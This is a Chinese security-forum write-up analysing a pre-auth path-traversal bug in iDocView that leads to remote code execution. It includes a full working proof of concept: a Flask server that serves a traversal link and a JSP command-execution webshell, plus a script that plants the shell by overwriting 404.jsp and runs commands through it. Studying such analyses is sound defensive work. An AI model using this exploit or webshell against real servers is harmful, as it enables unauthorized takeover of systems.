# IDocView前台远程代码执行漏洞分析

> **来源**: https://forum.butian.net/share/2598  
> **文章ID**: 2598

---

![](images/attach-bc20688be4c26afbeeb5ed389491b63a660386dc.png)

昨天注意到一个IDocView系统的漏洞被披露了，发现是几个月之前审计过的漏洞，这里和师傅们分享一下当时的漏洞分析记录。

影响范围
----

iDocView < 13.10.1\_20231115

漏洞原理
----

漏洞原理大概就是使用未过滤的接口进行远程文件下载，会对传入的url进行下载，并且会解析url对应源码标签中的链接标签并且进行下载，而标签链接解析下载的过程中存在路径过滤缺陷导致任意文件上传。

过滤检查
----

IDocView通过Tomcat+Spring-Mvc布置在Windows中，请求接口过滤通过继承于org.springframework.web.servlet.handler.HandlerInterceptorAdapter的com.idocv.docview.interceptor.ViewInterceptor进行定义，

com.idocv.docview.interceptor.ViewInterceptor#preHandle 是任何请求都会调用的过滤函数，主要会对文件预览、文件上传、文件下载功能接口进行身份验证。

且com.idocv.docview.interceptor.ViewInterceptor#thdViewCheckSwitch=false 不会进行upload和download接口进行身份验证。

![](images/attach-1b7cde22fa9f11fbe65f709d5eb52a3d5ad686f5.png)

漏洞入口
----

/html/2word对应的入口函数为com.idocv.docview.controller.HtmlController#toWord

![](images/attach-a846c6f5159ecba7df2c96a3172ee310f3cc0b42.png)

函数大致流程如下：

1. 计算url的md5值作为子目录名
2. 判断子目录是否存在，不存在则根据url链接下载资源
3. 判断是否存在文件md5Url + ".docx"是否存在
4. 不存在则通过pandoc.exe生成md5Url + ".docx"文件
5. 返回md5Url + ".docx"文件

其中关键函数为下载资源的com.idocv.docview.util.GrabWebPageUtil#downloadHtml

![](images/attach-f1b734d5817f5c50fdc200e66425f146f34aaf2f.png)

传入url到downloadHtml函数后首先是会对getWebPage进行文件下载

（函数较长所以分几个部分截图了）

首先是进行一些请求的header设置

![](images/attach-62c8d1347a88595dff9bba54c49ea84e07fd9d31.png)

下面会下载url文件源码内容后进行一些格式解析处理后写入到url链接中指定的文件名中

![](images/attach-780263af0ef72c4f64a781f9b64a8edd1b976ff8.png)

看到这里之前审计的时候发现有asp、aspx、php这些可能为webshell格式的过滤而没有过滤jsp后缀。传入第二个参数中的outputDir指定了目录，而这个目录并不能被我们直接通过url指定；同时下载的文件名在第三个参数指定为index.html，所以下载文件的位置并不能给我们指定。

![](images/attach-08f9074547208b5655dbd1c58b875ef7a378b1f5.png)

问题并不是出在第一次执行的getWebPage

远程文件下载
------

com.idocv.docview.util.GrabWebPageUtil#getWebPage(java.net.URL, java.io.File, java.lang.String)

在第一次下载url内容的时候并不能进行利用，但是在下面再次调用了getWebPage函数

![](images/attach-351f30bd584f6c112847841842404be5d48fca61.png)

这里的双参数和三参数的getWebPage是一样的，双参数将最后一个保存文件名进行指定，如果第三个参数未指定，则会根据url获得最后一个/之后的字符串作为文件名

```Java
public static void getWebPage(URL obj, File outputDir) {
   getWebPage(obj, outputDir, (String)null);
}
```

```Java
String path = obj.getPath();
String filename = path.substring(path.lastIndexOf(47) + 1);
if (filename.equals("/") || filename.equals("")) {
   filename = "default.html";
}

System.out.println(filename);
if (StringUtils.isNotBlank(fileName)) {
   filename = fileName;
}
```

而之后在这个For循环中的链接是源自于第一次从链接中下载的页面源码，并且从中解析出img、link、script中的指定加载的远程连接文件，且解析后的链接会加入到GrabUtility.*filesToGrab中。*

录入访问链接http://host:port/links.html返回的内容为：

```Java
<img src="https://host:port/1.png">
```

那么1.png图片就会下载于md5为名的子目录下：

![](images/attach-3baa001ca9833453a9bdb251644a0c7c6319b981.png)

Poc构建
-----

到这里攻击流程其实就已经可以进行webshell文件上传了：

1. web服务器里面存放一个links.html文件写入带着目录穿越路径的url链接：
    
    ```Java
    <link href="http://127.0.0.1:5050/..\..\..\..\docview\\WEB-INF\\views\\404.jsp">
    ```
2. 访问`/docview/html/2word`传入url=<http://server-host/links.html>
3. 受害服务器下载links.html文件并且解析出link 标签的下载文件路径`..\..\..\..\docview\\WEB-INF\\views\\404.jsp`并且将文件名通过目录拼接的方式保存到本地
4. web服务器里面定义路由，当访问`..\..\..\..\docview\\WEB-INF\\views\\404.jsp`路径的时候，返回一个webshell文件
5. 最后访问一个任意IdocView不存在的路由就会加载覆盖后的404.jspwebshell文件

```Java
import random
import threading
import time
import requests
from flask import Flask, request

app = Flask(__name__)

raw_404_page="404 Page Text"
jsp_webshell = """
<!-- request with Parameter 'cmd'-->
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<%=output %>"""

@app.route('/<path:path>')
def serve_content(path):
    if "jsp" in request.url:
        return raw_404_page + jsp_webshell
    elif "links" in request.url:
        return  f"""<link href="http://127.0.0.1:5050/..\\..\\..\\..\\docview\\WEB-INF\\views\\404.jsp">"""
    else:
        return 'who are you???'

def exp(host):
    time.sleep(5)
    url = host + '/html/2word'
    r = requests.post(url,
                      data={
                          "url": f"http://127.0.0.1:5050/links.html_{random.Random().randint(0, 1000000)}"
                      })
    print(r.status_code)
    print(r.text)
    requests.get(host+"/xxx?cmd=calc")

if __name__ == '__main__':
    threading.Thread(target=exp,args=("http://192.168.92.1:8080/docview",)).start()
    app.run(port=5050,debug=True,host='0.0.0.0')
```

![](images/attach-687945e158d353471e8a16424d6beff5fe3e7cfc.png)

这是执行命令前访问/xxx?cmd=whoami的结果

![](images/attach-13621abcdd18891fc53c073e7391ab9bf4b1d0d8.png)

执行脚本后404页面变化执行命令输出回显

![](images/attach-dc5637e07644b58b1d4e0090d72b4c15646b1d9c.png)
